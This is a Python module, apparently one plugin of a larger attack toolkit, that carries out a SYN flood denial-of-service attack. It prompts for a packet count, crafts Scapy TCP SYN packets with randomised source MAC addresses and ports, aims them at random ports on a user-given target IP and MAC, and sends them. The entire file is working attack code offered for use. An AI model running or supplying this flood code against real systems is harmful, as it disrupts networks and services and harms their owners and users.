from Project import *
req_port = "any"
name = "SYN Flood"
function_name = "syn_flood"

def syn_flood():
    print("SYN Flood")
    valid_var = ["quantity"]
    help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
    print("\nRunning SYN Flood attack, please enter the parameters:\n")
    variable_input(valid_var, help_statement)
    all_variables_inputted(valid_var)
    check_var(values, valid_var)
    template = (Ether(src=RandMAC(), dst=values.get("target_mac_address"))/IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S"))
    ns = []
    pktAmt = int(values.get("quantity"))
    for pktNum in range(0,pktAmt):
        ns.extend(template)
        ns[pktNum][TCP].dport = random.choice(ports)
    print(ns)
    send(ns)
    print("Packets sent")
